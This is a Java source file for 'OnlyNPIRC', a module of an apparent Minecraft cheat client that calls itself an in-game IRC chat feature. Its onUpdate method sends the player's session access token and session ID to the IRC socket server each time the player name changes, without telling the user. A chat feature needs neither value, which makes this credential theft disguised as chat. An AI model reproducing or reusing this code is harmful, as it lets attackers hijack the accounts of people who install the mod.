package me.nullpoint.mod.modules.impl.client;

import me.nullpoint.Nullpoint;
import me.nullpoint.mod.modules.Module;
import me.nullpoint.mod.modules.settings.impl.EnumSetting;
import me.nullpoint.socket.network.packet.impl.info.GameInfoPacket;

public class OnlyNPIRC extends Module {
    public static OnlyNPIRC INSTANCE;
    public final EnumSetting<type> tp = add(new EnumSetting<>("Type", type.Notify));
  public OnlyNPIRC() {
    super("OnlyNPIRC", "Internet Relay Chat for nullpoint", Category.Client);
      INSTANCE = this;
  }
    private String lastName;
    @Override
    public void onEnable() {
        sendNotify("Use "+Nullpoint.PREFIX+"np to send message to nullpoint IRC");
        this.reset();
    }
    @Override
    public void onDisable() {
        this.reset();
        if (Nullpoint.NPIRC.getClient().isConnected()) {
            Nullpoint.NPIRC.getClient().disconnect();
        }
    }

    // 注册
    public void onUpdate() {

            String name = String.valueOf(mc.player.getName());

        if (Nullpoint.NPIRC.getClient().isConnected()) {
            if (lastName == null || !lastName.equals(name)) {
                Nullpoint.NPIRC.send(new GameInfoPacket(name, mc.getSession().getAccessToken(), mc.getSession().getSessionId(), System.currentTimeMillis()));
                lastName = name;
            }
        } else {
            if (!Nullpoint.NPIRC.getClient().isConnecting()) {
                Nullpoint.NPIRC.getClient().start("127.0.0.1", 11451);
            }
        }
    }

    public void reset() {
        this.lastName = null;
    }
    public enum type {
        Notify,
        Chat
    }
}
